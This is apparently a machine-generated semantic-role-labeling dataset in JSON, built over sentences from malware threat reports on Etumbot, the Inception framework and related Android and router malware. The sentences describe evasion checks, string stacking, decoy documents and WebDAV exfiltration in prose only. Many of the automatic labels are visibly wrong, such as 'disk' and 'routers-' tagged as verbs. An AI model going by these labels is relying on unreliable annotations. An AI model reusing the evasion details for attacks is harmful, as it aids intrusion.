contrived example of this registration string generated by the Etumbot backdoor prior to encryption"}, "V": {"text": "is", "index": 15}, "ARG2": {"text": "as follows"}}, "follows": {"V": {"text": "follows", "index": 17}}, "has": {"V": {"text": "has", "index": 24}}, "registered": {"ARG1": {"text": "the bot"}, "V": {"text": "registered", "index": 25}, "ARG2": {"text": "with the C&C"}}, "will": {"V": {"text": "will", "index": 31}}, "send": {"ARGM-TMP": {"text": "the bot"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "send", "index": 32}, "ARG1": {"text": "periodic pings"}, "ARGM-PRP": {"text": "to ask for new commands to execute"}}, "ask": {"V": {"text": "ask", "index": 36}, "ARG1": {"text": "for new commands to execute"}}, "execute": {"ARG1": {"text": "new commands"}, "V": {"text": "execute", "index": 41}}}, " The first is a dropper which contains the backdoor binary (the\nsecond component) and the distraction file": {"is": {"ARG1": {"text": "The first"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a dropper which contains the backdoor binary ( the second component ) and the distraction file"}}, "contains": {"ARG0": {"text": "a dropper"}, "R-ARG0": {"text": "which"}, "V": {"text": "contains", "index": 6}, "ARG1": {"text": "the backdoor binary ( the second component ) and the distraction file"}}}, "                                                               5\n</footer>\n\f\n<header>Arbor Security Report: ASERT Threat Intelligence Brief 2014-07</header>\n\n\n\n\nEtumbot discovers the proxy settings of the local machine": {"discovers": {"ARG0": {"text": "Etumbot"}, "V": {"text": "discovers", "index": 2}, "ARG1": {"text": "the proxy settings of the local machine"}}}, "\n</section>\n\n<section>\n<header>Use of Byte Strings Technique (aka \u201cString Stacking\u201d)</header>\nEtumbot uses a technique to load strings into memory that has been called \u201cbyte strings\u201d and also \u201cstring\nstacking\u201d whereby character values are loaded into a specific memory location one byte at a time": {"uses": {"ARG0": {"text": "Etumbot"}, "V": {"text": "uses", "index": 1}, "ARG1": {"text": "a technique"}, "ARG2": {"text": "to load strings into memory that has been called \u201c byte strings \u201d and also \u201c string stacking \u201d whereby character values are loaded into a specific memory location one byte at a time"}}, "load": {"V": {"text": "load", "index": 5}, "ARG2": {"text": "strings/ into memory that has been called \u201c byte strings \u201d"}}, "has": {"V": {"text": "has", "index": 10}}, "been": {"V": {"text": "been", "index": 11}}, "called": {"ARG1": {"text": "a technique to load strings into memory"}, "R-ARG1": {"text": "that"}, "V": {"text": "called", "index": 12}, "ARG2": {"text": "\u201c byte strings \u201d"}}, "string": {"V": {"text": "string", "index": 20}, "ARG1": {"text": "stacking"}}, "stacking": {"ARG1": {"text": "string/ \u201d"}, "V": {"text": "stacking", "index": 21}}, "are": {"V": {"text": "are", "index": 26}}, "loaded": {"R-ARG2": {"text": "\u201d/ whereby"}, "ARG2": {"text": "character values"}, "V": {"text": "loaded", "index": 27}, "ARG1": {"text": "into a specific memory location one byte"}, "ARGM-TMP": {"text": "at a time"}}}, "\n\nMost Etumbot samples observed by ASERT drop decoy documents (PDFs, Word Documents, and Excel\nSpreadsheets) written in Traditional Chinese and usually pertaining to Cross-Strait or Taiwanese\nGovernment interests": {"observed": {"ARG0": {"text": "Most Etumbot samples"}, "V": {"text": "observed", "index": 3}, "ARGM-MNR": {"text": "by ASERT drop decoy documents ( PDFs , Word Documents"}}, "written": {"ARG1": {"text": "Excel Spreadsheets )"}, "V": {"text": "written", "index": 19}, "ARGM-LOC": {"text": "in Traditional Chinese"}}, "pertaining": {"ARG0": {"text": "Excel Spreadsheets"}, "ARGM-TMP": {"text": "usually"}, "V": {"text": "pertaining", "index": 25}, "ARG1": {"text": "to Cross - Strait or Taiwanese Government interests"}}}, " kb71271.log is\nthen deleted": {"is": {"ARG1": {"text": "kb71271.log"}, "V": {"text": "is", "index": 1}, "ARGM-TMP": {"text": "then"}, "ARG2": {"text": "deleted"}}, "deleted": {"ARG1": {"text": "kb71271.log"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "deleted", "index": 3}}}, "\n\nBefore\u00a0execution,\u00a0the\u00a0malware\u00a0makes\u00a0a\u00a0couple\u00a0of\u00a0checks\u00a0to\u00a0avoid\u00a0analysis,\u00a0including\u00a0checking\u00a0for\u00a0the\npresence\u00a0of\u00a0a\u00a0debugger\u00a0using\u00a0IsDebuggerPresent\u00a0as\u00a0well\u00a0as\u00a0checking\u00a0for\u00a0the\u00a0presence\u00a0of\u00a0VirtualBox\u00a0by\nlooking\u00a0for\u00a0the\u00a0device\u00a0name\u00a0\\\\.\\VBoxMiniRdrDN:\n\n\u00a0\n\n\n\n\nThe\u00a0malware\u00a0also\u00a0checks\u00a0for\u00a0the\u00a0presence\u00a0of\u00a0several\u00a0anti\u00advirus\u00a0solutions,\u00a0as\u00a0well\u00a0for\u00a0any\u00a0processes\nincluding\u00a0the\u00a0word\u00a0\u2018security\u2019:\n\fThe\u00a0malware\u00a0then\u00a0proceeds\u00a0to\u00a0decrypt\u00a0some\u00a0basic\u00a0configuration\u00a0data,\u00a0including\u00a0the\u00a0command\u00a0&\u00a0control\ndomain,\u00a0and\u00a0information\u00a0about\u00a0the\u00a0origin\u00a0of\u00a0the\u00a0infection,\u00a0tracked\u00a0via\u00a0ID:\n\n\u00a0\u00a0\n\n\n\n\nMeanwhile,\u00a0the\u00a0malware\u00a0begins\u00a0calling\u00a0home,\u00a0whilst\u00a0also\u00a0keeping\u00a0a\u00a0log\u00a0of\u00a0its\u00a0actions": {"makes": {"ARGM-TMP": {"text": "Before execution"}, "ARG0": {"text": "the malware"}, "V": {"text": "makes", "index": 5}, "ARG1": {"text": "a couple of checks to avoid analysis , including checking for the presence of a debugger using IsDebuggerPresent as well as checking for the presence of VirtualBox by looking for the device name \\\\.\\VBoxMiniRdrDN : The malware also checks for the presence of several anti\u00advirus solutions , as well for any processes including the word \u2018 security \u2019 : The malware then proceeds to decrypt some basic configuration data , including the command & control domain"}, "C-ARG1": {"text": "and information about the origin of the infection"}}, "avoid": {"ARG0": {"text": "a couple of checks"}, "V": {"text": "avoid", "index": 11}, "ARG1": {"text": "analysis"}}, "including": {"V": {"text": "including", "index": 14}, "ARG1": {"text": "checking for the presence of a debugger using IsDebuggerPresent as well as checking for the presence of VirtualBox by looking for the device name \\\\.\\VBoxMiniRdrDN"}}, "checking": {"V": {"text": "checking", "index": 15}, "ARG1": {"text": "for the presence of a debugger using"}}, "using": {"ARG0": {"text": "a"}, "V": {"text": "using", "index": 22}}, "checking_2": {"V": {"text": "checking", "index": 27}, "ARGM-PRP": {"text": "for the presence of VirtualBox"}, "ARGM-MNR": {"text": "by looking for the device name \\\\.\\VBoxMiniRdrDN"}}, "looking": {"V": {"text": "looking", "index": 34}, "ARG1": {"text": "for the device name \\\\.\\VBoxMiniRdrDN"}}, "\\\\.\\VBoxMiniRdrDN": {"ARG1": {"text": "the device name"}, "V": {"text": "\\\\.\\VBoxMiniRdrDN", "index": 39}}, "checks": {"ARG0": {"text": "The malware"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "checks", "index": 44}, "ARG1": {"text": "for the presence of several anti\u00advirus solutions"}}, "including_2": {"ARG2": {"text": "any processes"}, "V": {"text": "including", "index": 58}, "ARG1": {"text": "the word \u2018 security \u2019"}}, "proceeds": {"ARG1": {"text": "The malware/ to decrypt some basic configuration data , including the command & control domain , and information about the origin/ the infection"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "proceeds", "index": 68}}, "decrypt": {"V": {"text": "decrypt", "index": 70}, "ARG1": {"text": "some basic configuration data , including the command & control domain"}}, "including_3": {"ARG2": {"text": "some basic configuration data"}, "V": {"text": "including", "index": 76}, "ARG1": {"text": "the command & control domain"}}, "tracked": {"ARG1": {"text": "information about the origin of the infection"}, "V": {"text": "tracked", "index": 92}, "ARGM-MNR": {"text": "via ID"}}, "begins": {"ARGM-TMP": {"text": "Meanwhile"}, "ARG1": {"text": "the malware"}, "V": {"text": "begins", "index": 100}, "ARGM-PRD": {"text": "calling home/ whilst also keeping a log of its actions"}}, "calling": {"ARG0": {"text": "the malware"}, "V": {"text": "calling", "index": 101}, "ARG2": {"text": "home"}, "ARGM-ADV": {"text": "whilst/ also keeping a log of its actions"}}, "keeping": {"ARG0": {"text": "the malware"}, "ARGM-ADV": {"text": "whilst/ also"}, "V": {"text": "keeping", "index": 106}, "ARG1": {"text": "a log of its actions"}}}, "\n\nBefore\u00a0execution,": {}, "\n\nBefore\u00a0execution,\u00a0the\u00a0malware\u00a0makes\u00a0a\u00a0couple\u00a0of\u00a0checks\u00a0to\u00a0avoid\u00a0analysis,\u00a0including\u00a0checking\u00a0for\u00a0the\npresence\u00a0of\u00a0a\u00a0debugger\u00a0using\u00a0IsDebuggerPresent\u00a0as\u00a0well\u00a0as\u00a0checking\u00a0for\u00a0the\u00a0presence\u00a0of\u00a0VirtualBox\u00a0by\nlooking\u00a0for\u00a0the\u00a0device\u00a0name\u00a0\\\\.\\VBoxMiniRdrDN:\n\n\u00a0\n\n\n\n\nThe\u00a0malware\u00a0also\u00a0checks\u00a0for\u00a0the\u00a0presence\u00a0of\u00a0several\u00a0anti\u00advirus\u00a0solutions,": {"makes": {"ARGM-TMP": {"text": "Before execution"}, "ARG0": {"text": "the malware"}, "V": {"text": "makes", "index": 5}, "ARG1": {"text": "a couple of checks to avoid analysis/ including checking for the presence of a debugger using IsDebuggerPresent"}}, "avoid": {"V": {"text": "avoid", "index": 11}, "ARG1": {"text": "analysis"}}, "including": {"ARG2": {"text": "a couple of checks to"}, "V": {"text": "including", "index": 14}, "ARG1": {"text": "checking for the presence of a debugger using IsDebuggerPresent as well as checking for the presence of VirtualBox"}}, "checking": {"V": {"text": "checking", "index": 15}, "ARG1": {"text": "for the presence of a debugger using"}}, "using": {"V": {"text": "using", "index": 22}}, "checking_2": {"V": {"text": "checking", "index": 27}, "ARGM-PRP": {"text": "for the presence of VirtualBox"}, "ARGM-MNR": {"text": "by looking for the device name \\\\.\\VBoxMiniRdrDN"}}, "looking": {"V": {"text": "looking", "index": 34}, "ARG1": {"text": "for the device name \\\\.\\VBoxMiniRdrDN"}}, "\\\\.\\VBoxMiniRdrDN": {"ARG1": {"text": "the device name"}, "V": {"text": "\\\\.\\VBoxMiniRdrDN", "index": 39}}, "checks": {"ARG0": {"text": "The malware"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "checks", "index": 44}, "ARG1": {"text": "for the presence of several anti\u00advirus solutions"}}}, "\n</section>\n\n<section>\n\u00a0\n<heading> \fAfter\u00a0successful\u00a0compromise\u2026 </heading>\n\nIt\u00a0appears\u00a0as\u00a0though\u00a0the\u00a0clue\u00a0for\u00a0the\u00a0main\u00a0functionality\u00a0of\u00a0this\u00a0malware\u00a0is\u00a0in\u00a0its\u00a0name\u00a0(it\u00a0downloads,\u00a0and\nthen\u00a0executes)\u00a0files,\u00a0as\u00a0it\u00a0offers\u00a0little\u00a0else\u00a0for\u00a0the\u00a0attacker.\u00a0The\u00a0DownExecute\u00a0malware\u00a0is\u00a0used\u00a0as\u00a0a\u00a0way\nfor\u00a0the\u00a0attackers\u00a0to\u00a0gain\u00a0an\u00a0initial\u00a0foothold\u00a0on\u00a0the\u00a0victim\u00a0machine.\u00a0The\u00a0basic\u00a0information": {"appears": {"V": {"text": "appears", "index": 1}, "ARG1": {"text": "as though the clue for the main functionality of this malware is in its name ( it downloads , and then executes ) files , as it offers little else for the attacker . The DownExecute malware is used as a way for the attackers to gain an initial foothold on the victim machine . The basic information"}}, "is": {"ARG1": {"text": "the clue for the main functionality of this malware"}, "V": {"text": "is", "index": 13}, "ARG2": {"text": "in its name"}}, "downloads": {"ARG0": {"text": "it"}, "V": {"text": "downloads", "index": 19}}, "executes": {"ARGM-TMP": {"text": "then"}, "V": {"text": "executes", "index": 23}, "ARG1": {"text": ") files"}, "ARGM-ADV": {"text": "as it offers little else for the attacker"}}, "offers": {"ARG0": {"text": "it"}, "V": {"text": "offers", "index": 29}, "ARG1": {"text": "little else for the attacker"}}, "is_2": {"V": {"text": "is", "index": 39}}, "used": {"ARGM-ADV": {"text": "as though the clue for the main functionality of this malware is in its name ( it downloads , and then executes ) files ,/ as it offers little else for the attacker"}, "ARG1": {"text": "The DownExecute malware"}, "V": {"text": "used", "index": 40}, "ARG2": {"text": "as a way for the attackers to gain an initial foothold on the victim machine . The basic information"}}, "gain": {"ARGM-MNR": {"text": "a way"}, "ARG0": {"text": "the attackers"}, "V": {"text": "gain", "index": 48}, "ARG1": {"text": "an initial foothold on the victim machine . The basic information"}}}, "\n</section>\n\n<section>\n\u00a0\n<heading> \fAfter\u00a0successful\u00a0compromise\u2026 </heading>\n\nIt\u00a0appears\u00a0as\u00a0though\u00a0the\u00a0clue\u00a0for\u00a0the\u00a0main\u00a0functionality\u00a0of\u00a0this\u00a0malware\u00a0is\u00a0in\u00a0its\u00a0name\u00a0(it": {"appears": {"V": {"text": "appears", "index": 1}, "ARG1": {"text": "as though the clue for the main functionality of this malware is in its name ( it"}}, "is": {"ARG1": {"text": "the clue for the main functionality of this malware"}, "V": {"text": "is", "index": 13}, "ARG2": {"text": "in its name ("}}}, "\n</section>\n\n\n\n<footer>37</footer>\n\f\n<section>\n<heading>Mobile malware: Android</heading>\n\n\nAccessing the link from an Android User-Agent initiated a download of an\nAndroid installer package named WhatsAppUpdate.apk": {"Accessing": {"V": {"text": "Accessing", "index": 0}, "ARG1": {"text": "the link from an Android User - Agent"}}, "initiated": {"ARG0": {"text": "Accessing the link from an Android User - Agent"}, "V": {"text": "initiated", "index": 9}, "ARG1": {"text": "a download of an Android installer package"}}, "named": {"R-ARG1": {"text": "Accessing the link from an Android User - Agent initiated a download"}, "ARG1": {"text": "of an Android installer package"}, "V": {"text": "named", "index": 17}, "ARG2": {"text": "WhatsAppUpdate.apk"}}}, "\n\ntail- serves as a SOCKS proxy for the attackers": {}, "\n\nThe encrypted files uploaded to the WebDAV shares come with their InitVectors\nstored at the end of the file": {"encrypted": {"V": {"text": "encrypted", "index": 1}, "ARG1": {"text": "files"}}, "uploaded": {"ARG1": {"text": "The encrypted files"}, "V": {"text": "uploaded", "index": 3}, "ARG2": {"text": "to the WebDAV shares"}}, "come": {"ARG1": {"text": "The encrypted files uploaded to the WebDAV shares"}, "V": {"text": "come", "index": 8}, "ARGM-MNR": {"text": "with their InitVectors stored"}, "ARG2": {"text": "at the end of the file"}}, "stored": {"ARG1": {"text": "their InitVectors"}, "V": {"text": "stored", "index": 12}, "ARGM-TMP": {"text": "at the end of"}, "ARGM-LOC": {"text": "the file"}}}, "\nThe survey is then uploaded to the server in a specified folder with the generated\nname": {"is": {"ARG1": {"text": "The survey"}, "V": {"text": "is", "index": 2}, "ARGM-TMP": {"text": "then"}, "ARG2": {"text": "uploaded to the server in a specified folder with the generated name"}}, "uploaded": {"ARG1": {"text": "The survey"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "uploaded", "index": 4}, "ARG2": {"text": "to the server"}, "ARGM-LOC": {"text": "in a specified folder"}, "ARGM-MNR": {"text": "with the generated name"}}, "specified": {"V": {"text": "specified", "index": 10}, "ARG1": {"text": "folder"}}, "generated": {"V": {"text": "generated", "index": 14}, "ARG1": {"text": "name"}}}, "\nRecordings are stored as *.mp4 files, and uploaded to the attackers periodically": {"are": {"V": {"text": "are", "index": 1}}, "stored": {"ARG1": {"text": "Recordings"}, "V": {"text": "stored", "index": 2}, "ARGM-PRD": {"text": "as * .mp4 files"}}, "uploaded": {"ARG1": {"text": "Recordings"}, "V": {"text": "uploaded", "index": 9}, "ARG2": {"text": "to the attackers"}, "ARGM-TMP": {"text": "periodically"}}}, " The framework is notable for a number of reasons, including (but not\nlimited to) its use of a cloud-based infrastructure for command-and-control and its\nuse of the WebDAV protocol to send instructions and receive exfiltrated\ninformation from compromised systems": {"is": {"ARG1": {"text": "The framework"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "notable"}, "ARGM-CAU": {"text": "for a number of reasons , including ( but not limited to ) its use of a cloud - based infrastructure for command - and - control and its use of the WebDAV protocol to send instructions and receive exfiltrated information from compromised systems"}}, "including": {"ARG2": {"text": "reasons"}, "V": {"text": "including", "index": 10}, "ARG1": {"text": "("}}, "limited": {"ARGM-NEG": {"text": "not"}, "V": {"text": "limited", "index": 14}, "ARG2": {"text": "to ) its use of a cloud - based infrastructure for command - and - control and its use of the WebDAV protocol to send instructions and receive exfiltrated information from compromised systems"}}, "based": {"ARG2": {"text": "cloud"}, "V": {"text": "based", "index": 23}, "ARG1": {"text": "infrastructure"}}, "send": {"V": {"text": "send", "index": 39}, "ARG1": {"text": "instructions"}}, "receive": {"V": {"text": "receive", "index": 42}, "ARG1": {"text": "exfiltrated information"}, "ARG2": {"text": "from compromised systems"}}, "compromised": {"V": {"text": "compromised", "index": 46}, "ARG1": {"text": "systems"}}}, "\n\nThe binary also checks a separate folder on the cloud service designated to\ncontain new configuration information": {"checks": {"ARG0": {"text": "The binary"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "checks", "index": 3}, "ARG1": {"text": "a separate folder on the cloud service designated to contain new configuration information"}}, "designated": {"ARG1": {"text": "a separate folder on the cloud service"}, "V": {"text": "designated", "index": 11}, "ARG2": {"text": "to contain new configuration information"}}, "contain": {"V": {"text": "contain", "index": 13}, "ARG1": {"text": "new configuration information"}}}, "\n</list>\n\n\n\n<footer>41</footer>\n\f\nThese data are encrypted and uploaded to an FTP account which is taken from\nan encrypted configuration file named /usr/bin/cores": {"are": {"ARG1": {"text": "These"}, "V": {"text": "are", "index": 2}, "ARG2": {"text": "encrypted"}}, "encrypted": {"ARG1": {"text": "These data"}, "V": {"text": "encrypted", "index": 3}}, "uploaded": {"ARG1": {"text": "These data"}, "V": {"text": "uploaded", "index": 5}, "ARG2": {"text": "to an FTP account which is taken from an encrypted configuration file named /usr / bin"}}, "is": {"V": {"text": "is", "index": 11}}, "taken": {"ARG1": {"text": "an FTP account"}, "R-ARG1": {"text": "which"}, "V": {"text": "taken", "index": 12}, "ARG2": {"text": "from an encrypted configuration file named /usr / bin"}}, "encrypted_2": {"V": {"text": "encrypted", "index": 15}, "ARG1": {"text": "configuration file"}}, "named": {"ARG1": {"text": "encrypted configuration file"}, "V": {"text": "named", "index": 18}, "ARG2": {"text": "/usr"}}}, "\n</section>\n\n\n\n<footer>46</footer>\n\f\n<section>\n<heading>The Chinese connection</heading>\n\nOn at least two occasions during our surveillance of the Inception framework, the\nmalware downloaded something unexpected and wholly different from what we\nhave discussed until now": {"downloaded": {"ARGM-TMP": {"text": "On at least two occasions during our surveillance of the Inception framework"}, "ARG0": {"text": "the malware"}, "V": {"text": "downloaded", "index": 15}, "ARG1": {"text": "something unexpected and wholly different from what we have discussed until now"}}, "have": {"V": {"text": "have", "index": 24}}, "discussed": {"ARG1": {"text": "what"}, "ARG0": {"text": "we"}, "V": {"text": "discussed", "index": 25}, "ARGM-TMP": {"text": "until now"}}}, "\n</list>\nAfter a router SOCKSS port was opened by Unlocker, this IP would connect to\nthe opened port and tunnel its email traffic through the router": {"was": {"V": {"text": "was", "index": 5}}, "opened": {"ARG1": {"text": "a router SOCKSS port"}, "V": {"text": "opened", "index": 6}, "ARG0": {"text": "by Unlocker"}}, "would": {}, "connect": {"ARGM-TMP": {"text": "After a router SOCKSS port was opened by Unlocker"}, "ARG0": {"text": "this IP"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "connect", "index": 13}, "ARG1": {"text": "to the opened port and tunnel its email traffic through the router"}}, "opened_2": {"V": {"text": "opened", "index": 16}, "ARG1": {"text": "port"}}, "tunnel": {"ARGM-TMP": {"text": "After a router SOCKSS port was opened by Unlocker"}, "ARG0": {"text": "this IP"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "tunnel", "index": 19}, "ARG1": {"text": "its email traffic"}, "ARGM-MNR": {"text": "through the router"}}}, "\n\nFirst of all, we have the decoy documents which indicate an interest in:\n<list>\n   -   Embassies\n   -   Politics\n   -   Finance\n   -   Military\n   -   Engineering\n</list>\nWe also have a set of phishing mails, which were targeted at:\n<list>\n   -   The finance sector in Russia\n   -   The oil and energy industry in Romania, Venezuela, and Mozambique\n   -   Embassies and diplomats from various countries\n</list>\n\n</section>\n\n<footer>10</footer>\n\f\n<section>\n<heading>Shellcode</heading>\n\n\nThe shellcode used is a pretty standard variant previously used by a number of\ncampaigns typically operating out of China, but with some minor changes": {"have": {"ARGM-DIS": {"text": "First of all"}, "ARG0": {"text": "we"}, "V": {"text": "have", "index": 5}, "ARG1": {"text": "the decoy documents which indicate an interest in"}}, "indicate": {"ARG0": {"text": "the decoy documents"}, "R-ARG0": {"text": "which"}, "V": {"text": "indicate", "index": 10}, "ARG1": {"text": "an interest in"}}, "used": {"ARG1": {"text": "The shellcode"}, "V": {"text": "used", "index": 17}}, "is": {"ARG1": {"text": "The shellcode used"}, "V": {"text": "is", "index": 18}, "ARG2": {"text": "a pretty standard variant previously used by a number of campaigns typically operating out of China , but with some minor changes"}}, "used_2": {"ARG1": {"text": "a pretty standard variant"}, "ARGM-TMP": {"text": "previously"}, "V": {"text": "used", "index": 24}, "ARG0": {"text": "by a number of campaigns typically operating out of China"}}, "operating": {"ARG1": {"text": "a number of campaigns"}, "ARGM-ADV": {"text": "typically"}, "V": {"text": "operating", "index": 31}, "ARG3": {"text": "out of China"}}}, "\n\n              The attackers utilize compromised embedded devices \u2013 typically routers- on the\n              Internet as well as multiple dedicated hosting providers and VPN services to\n              mask their identity from the cloud storage provider and others": {"utilize": {"ARG0": {"text": "The attackers"}, "V": {"text": "utilize", "index": 2}, "ARG1": {"text": "compromised embedded devices \u2013 typically routers-"}, "ARGM-LOC": {"text": "on the Internet"}, "ARGM-PRP": {"text": "to mask their identity from the cloud storage provider and others"}}, "compromised": {"V": {"text": "compromised", "index": 3}, "ARG1": {"text": "embedded devices"}}, "embedded": {"ARG2": {"text": "The attackers/ as well as multiple dedicated hosting providers and VPN services"}, "V": {"text": "embedded", "index": 4}, "ARG1": {"text": "devices"}, "ARGM-MNR": {"text": "\u2013 typically routers-"}, "ARGM-LOC": {"text": "on the Internet"}, "ARGM-PRP": {"text": "to mask their identity from the cloud storage provider and others"}}, "routers-": {"ARGM-ADV": {"text": "typically"}, "V": {"text": "routers-", "index": 8}, "ARG2": {"text": "on the Internet"}, "ARGM-PRP": {"text": "to mask their identity from the cloud storage provider and others"}}, "mask": {"V": {"text": "mask", "index": 23}, "ARG1": {"text": "their identity"}, "ARG2": {"text": "from the cloud storage provider and others"}}}, " This seems adapted from Microsoft example code, like\nthe one found at http://msdn.microsoft.com/en-us/library/aa387236(v=vs.85).aspx\n\n<figure></figure>\n\n\nWhen the VBSript is run it drops two files to disk": {"seems": {"V": {"text": "seems", "index": 1}, "ARG1": {"text": "adapted from"}}, "adapted": {"ARG1": {"text": "This"}, "V": {"text": "adapted", "index": 2}, "ARG3": {"text": "from Microsoft example code"}, "ARGM-MNR": {"text": "like the one found at http://msdn.microsoft.com/en-us/library/aa387236(v=vs.85).aspx When the VBSript is run it drops two files to disk"}}, "found": {"ARG1": {"text": "the one"}, "V": {"text": "found", "index": 11}, "ARGM-LOC": {"text": "at http://msdn.microsoft.com/en-us/library/aa387236(v=vs.85).aspx"}, "ARGM-TMP": {"text": "When the VBSript is run"}}, "is": {"V": {"text": "is", "index": 17}}, "run": {"ARGM-TMP": {"text": "When"}, "ARG1": {"text": "the VBSript"}, "V": {"text": "run", "index": 18}}, "drops": {"ARG0": {"text": "it"}, "V": {"text": "drops", "index": 20}, "ARG1": {"text": "two files"}, "ARGM-PRD": {"text": "to disk"}}, "disk": {"V": {"text": "disk", "index": 24}}}, " It is a downloader and remote shell program,\ndesigned to connect to a C&C server to interact with the attacker and/or\ndownload more malware": {"is": {"ARG1": {"text": "It"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "a downloader and remote shell program , designed to connect to a C&C server to interact with the attacker and/or download more malware"}}, "designed": {"ARG1": {"text": "a downloader and remote shell program"}, "V": {"text": "designed", "index": 9}, "ARG3": {"text": "to connect to a C&C server to interact with the attacker and/or"}}, "connect": {"V": {"text": "connect", "index": 11}, "ARG1": {"text": "to a C&C server to interact with the attacker and/or download more malware"}}, "interact": {"V": {"text": "interact", "index": 17}, "ARG1": {"text": "with the attacker and/or"}}, "download": {"ARG0": {"text": "a"}, "V": {"text": "download", "index": 22}, "ARG1": {"text": "more malware"}}}, "\n\nThis configuration information is used to load the encrypted file into memory and\ndecrypt it": {"is": {"ARG1": {"text": "This configuration information"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "used to load the encrypted file into memory and decrypt it"}}, "used": {"V": {"text": "used", "index": 4}, "ARG2": {"text": "to load the encrypted file into memory and decrypt it"}}, "load": {"ARG0": {"text": "This configuration information"}, "V": {"text": "load", "index": 6}, "ARG2": {"text": "the encrypted file into memory and decrypt it"}}, "encrypted": {"V": {"text": "encrypted", "index": 8}, "ARG1": {"text": "file"}}, "decrypt": {"V": {"text": "decrypt", "index": 13}, "ARG1": {"text": "it"}}}, " All of this is encrypted and then\nsent to cloud storage via WebDAV": {"is": {"ARG1": {"text": "All of this"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "encrypted and then sent to cloud storage via WebDAV"}}, "encrypted": {"ARG1": {"text": "All of this"}, "V": {"text": "encrypted", "index": 4}}, "sent": {"ARG1": {"text": "All of this"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "sent", "index": 7}, "ARG2": {"text": "to cloud storage"}, "ARGM-MNR": {"text": "via WebDAV"}}, "cloud": {"V": {"text": "cloud", "index": 9}, "ARG1": {"text": "storage via WebDAV"}}}, " This data file\nturns out to be encrypted using AES-256": {"turns": {"ARG1": {"text": "This data file"}, "V": {"text": "turns", "index": 3}, "C-ARG1": {"text": "to be encrypted using AES-256"}}, "be": {"V": {"text": "be", "index": 6}, "ARG2": {"text": "encrypted using AES-256"}}, "encrypted": {"ARG1": {"text": "This data file"}, "V": {"text": "encrypted", "index": 7}, "ARGM-MNR": {"text": "using AES-256"}}, "using": {"V": {"text": "using", "index": 8}, "ARG1": {"text": "AES-256"}}}, "\n\nFiles are compressed using a modified LZMA-compression and encrypted using\nAES cipher-block-chaining (CBC) before being uploaded to the cloud server": {"are": {"ARG1": {"text": "Files"}, "V": {"text": "are", "index": 1}, "ARG2": {"text": "compressed"}, "ARGM-PRD": {"text": "using a modified LZMA - compression and encrypted using AES cipher - block - chaining ( CBC )"}, "ARGM-ADV": {"text": "before being uploaded to the cloud"}}, "compressed": {"ARG1": {"text": "Files"}, "V": {"text": "compressed", "index": 2}, "ARGM-MNR": {"text": "using a modified LZMA - compression and encrypted using AES cipher - block - chaining ( CBC ) before being uploaded to the cloud server"}}, "using": {"V": {"text": "using", "index": 3}, "ARG1": {"text": "a modified LZMA - compression and encrypted"}, "ARGM-MNR": {"text": "using AES cipher - block - chaining ( CBC ) before being uploaded to"}}, "modified": {"V": {"text": "modified", "index": 5}, "ARG1": {"text": "LZMA - compression"}}, "encrypted": {"ARG1": {"text": "Files"}, "V": {"text": "encrypted", "index": 10}, "ARGM-MNR": {"text": "using AES cipher - block - chaining ( CBC )"}, "ARGM-TMP": {"text": "before being uploaded to the cloud server"}}, "using_2": {"V": {"text": "using", "index": 11}, "ARG1": {"text": "AES cipher - block - chaining ( CBC )"}, "ARGM-TMP": {"text": "before being uploaded to the cloud server"}}, "chaining": {"ARG1": {"text": "cipher - block"}, "V": {"text": "chaining", "index": 17}}, "being": {"V": {"text": "being", "index": 22}}, "uploaded": {"V": {"text": "uploaded", "index": 23}, "ARG2": {"text": "to the cloud server"}}}, " The malware\nalso checks configured subfolders for updates; and if these are found they will be\ndownloaded, decrypted and used as appropriate": {"checks": {"ARG0": {"text": "The malware"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "checks", "index": 3}, "ARG1": {"text": "configured subfolders"}, "ARGM-MNR": {"text": "for updates"}}, "configured": {"V": {"text": "configured", "index": 4}, "ARG1": {"text": "subfolders"}}, "are": {"V": {"text": "are", "index": 12}}, "found": {"ARG1": {"text": "these"}, "V": {"text": "found", "index": 13}}, "will": {"V": {"text": "will", "index": 15}}, "be": {"V": {"text": "be", "index": 16}}, "downloaded": {"ARGM-ADV": {"text": "if these are found"}, "ARG1": {"text": "they"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "downloaded", "index": 17}}, "decrypted": {"V": {"text": "decrypted", "index": 19}}, "used": {"ARGM-ADV": {"text": "if these are found"}, "ARG1": {"text": "they"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "used", "index": 21}, "ARG2": {"text": "as appropriate"}}}, " All\nof this information is exfiltrated back via the same WebDAV connection": {"is": {"V": {"text": "is", "index": 4}}, "exfiltrated": {"ARG1": {"text": "All of this information"}, "V": {"text": "exfiltrated", "index": 5}, "ARG3": {"text": "back"}, "ARGM-MNR": {"text": "via the same WebDAV connection"}}}, "\nThe order, size, and locations of these segments vary from build to build but\nsomewhere near the end of the large function there will be a call to a subfunction\nthat loads the PE image into memory, followed by a call to free the PE image\nallocation from memory": {"vary": {"ARG1": {"text": "The order , size , and locations"}, "ARG0": {"text": "of these segments"}, "V": {"text": "vary", "index": 10}, "ARG3": {"text": "from build to build"}}, "build": {"ARG1": {"text": "The order , size , and locations of these segments"}, "V": {"text": "build", "index": 14}}, "will": {"V": {"text": "will", "index": 25}}, "be": {"ARGM-TMP": {"text": "somewhere near the end of the large function"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "be", "index": 26}, "ARG1": {"text": "a call to a subfunction that loads the PE image into memory , followed by a call to free the PE image allocation from memory"}}, "loads": {"ARG0": {"text": "a subfunction"}, "R-ARG0": {"text": "that"}, "V": {"text": "loads", "index": 33}, "ARG1": {"text": "the PE image"}, "ARG2": {"text": "into memory"}}, "followed": {"ARG2": {"text": "a subfunction"}, "V": {"text": "followed", "index": 40}, 